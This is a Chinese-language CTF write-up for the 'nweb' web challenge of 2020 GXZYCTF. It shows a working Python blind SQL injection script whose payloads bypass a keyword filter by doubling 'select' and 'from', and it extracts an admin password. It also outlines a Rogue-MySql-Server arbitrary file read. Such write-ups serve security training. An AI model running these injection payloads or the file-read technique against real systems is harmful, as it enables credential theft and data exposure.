---
title: 2020 GXZYCTF nweb
date: 2020-03-09 09:52:20
tags:
- Web_信息收集
- Web_SQL
- Web_Rogue-MySql-Server
categories:
- Web
- PHP
top: 
---

根据登入后的提示，用户会有分级，注册账号的时候隐藏了type属性

![](2020_GXZYCTF_nweb/0-1583722768764.png)            

type赋值为110，登录后可以访问flag.php 里面是一个search框，可以测试一下注入

![img](2020_GXZYCTF_nweb/0-1583722779047.png)            

![img](2020_GXZYCTF_nweb/0-1583722789446.png)            

简单测试发现只过滤了select和from，可以双写绕过，所以写一个脚本跑就行了

```
# encoding=utf-8
import requests
flag= ''
url = 'http://121.37.179.47:1001/search.php'
Cookie = {'PHPSESSID':'huiulsnkb5bpm59h6v38o1qlv1;',
          'username':'41fcba09f2bdcdf315ba4119dc7978dd'}
proxies = {
        "http": "http://127.0.0.1:8080",
        }
#erfenfa
for i in range(1,50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        #payload=r"1' or 1=(ascii(mid(CONCAT_WS(CHAR(32,58,32),user(),database(),version()),{},1))>{})--+" #65
        #payload=r"1' or 1=(ascii(mid((selselectect group_concat(column_NAME) frfromom information_schema.columnS where table_name='admin'),{},1))>{})#"
        payload=r"1' or 1=(ascii(mid((selselectect pwd frfromom admin limit 1),{},1))>{})#"
        #payload=r"1' or 1=(ascii(mid((database()),{},1))>{})#"
        url_1=url+payload.format(i,mid)
        data={"flag":payload.format(i,mid)}
        r=requests.post(url,data=data,cookies=Cookie,proxies=proxies)
        print(r.content)
        if b"is flag" in  r.content:
            low=mid+1 
        else:
            high=mid
        mid=(low+high)//2
    print(flag)
    flag+=chr(mid)
```

数据库里只有一半的flag：flag{Rogue-MySql-Server- ，同时还得到了admin用户的密码：whoamiadmin

根据前半段flag和登录后的提示，也就是伪造mysql服务任意文件读取的问题了，通过Rogue-MySql-Server脚本设置读取一下flag.php文件

![](2020_GXZYCTF_nweb/0-1583751402598.png)            

也就拿到了flag的后一部分，拼接起来就可以了。